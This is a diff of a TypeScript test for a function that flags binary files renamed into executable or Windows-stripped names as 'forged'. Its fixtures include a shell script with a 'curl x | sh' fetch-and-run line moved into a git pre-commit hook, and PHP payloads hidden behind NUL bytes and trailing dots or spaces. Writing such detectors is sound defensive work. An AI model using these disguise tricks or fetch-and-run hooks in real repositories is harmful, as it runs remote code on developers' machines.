@@ -1732,7 +1732,7 @@ describe('countChangedLines', () => {
   // adds nothing, but a PNG on main carrying a `<?php` block, renamed to `.php`
   // or `.sh` or a name no format takes, is read as that name now, and so is a
   // NUL-carrying file whose extension changes case or that has none: no dot,
-  // as a payload moved to a hook, or a trailing one (decision 154).
+  // as a payload moved to a hook, or dots and spaces Windows strips (decision 154).
   it('skips a binary moved unchanged under its extension, and flags one renamed out of it', () => {
     const repo = initRepo();
     const png = (rest: string): Buffer =>
@@ -1747,6 +1747,9 @@ describe('countChangedLines', () => {
     writeFileSync(join(repo, 'tools', 'payload'), '#!/bin/sh\n# \0\ncurl x | sh\n');
     writeFileSync(join(repo, 'x.PHP'), `<?php // \0\n${php}`);
     writeFileSync(join(repo, 'a.'), `// \0\n${php}`);
+    writeFileSync(join(repo, 'a. '), `# \0\n${php}`);
+    writeFileSync(join(repo, 'a.. '), `/* \0 */\n${php}`);
+    writeFileSync(join(repo, 'x.png '), png('space\n'));
     sh(repo, 'git', 'add', '.');
     sh(repo, 'git', 'commit', '-q', '-m', 'binaries');
     sh(repo, 'git', 'checkout', '-q', '-b', 'feature');
@@ -1759,13 +1762,26 @@ describe('countChangedLines', () => {
     sh(repo, 'git', 'mv', 'tools/payload', '.husky/pre-commit');
     sh(repo, 'git', 'mv', 'x.PHP', 'x.php');
     sh(repo, 'git', 'mv', 'a.', 'b.php.');
+    sh(repo, 'git', 'mv', 'a. ', 'b.php. ');
+    sh(repo, 'git', 'mv', 'a.. ', 'b.. ');
+    sh(repo, 'git', 'mv', 'x.png ', 'y.png ');
     sh(repo, 'git', 'commit', '-q', '-m', 'move');
 
     expect(countChangedLines(repo, 'main', 'feature')).toEqual({
       source: 0,
       test: 0,
       docs: 0,
-      forged: ['.husky/pre-commit', 'b.php.', 'blob.dat', 'run.php', 'run.sh', 'x.php'],
+      forged: [
+        '.husky/pre-commit',
+        'b.. ',
+        'b.php.',
+        'b.php. ',
+        'blob.dat',
+        'run.php',
+        'run.sh',
+        'x.php',
+        'y.png ',
+      ],
     });
   });
 
